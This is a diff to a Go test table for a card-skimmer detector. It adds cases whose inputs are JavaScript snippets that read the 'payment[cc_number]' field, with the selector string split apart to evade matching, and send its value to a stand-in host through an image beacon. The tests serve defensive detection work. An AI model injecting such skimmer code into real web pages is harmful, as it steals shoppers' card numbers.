@@ -52,6 +52,8 @@ func TestSkimmerSignals(t *testing.T) {
 		"parens first":           {`var f=document.querySelector('[name="'+(('payment[c')+'c_number]')+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"regex after if":         {`if(x)/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"regex after block":      {`{x()}/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"both readings":          {`if(1){}/'/.test(1);var q=(1)/2;var s='payment[c'+'c_n'+'umber]';var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"both readings reversed": {`var q=(1)/2;if(1){}/'/.test(1);var f=document.querySelector('[name="'+'payment[c'+'c_n'+'umber]'+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"division after ++":      {`i++/2/3;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"after an object":        {`var o={a:1}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"keyword property":       {`var x=a.return/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
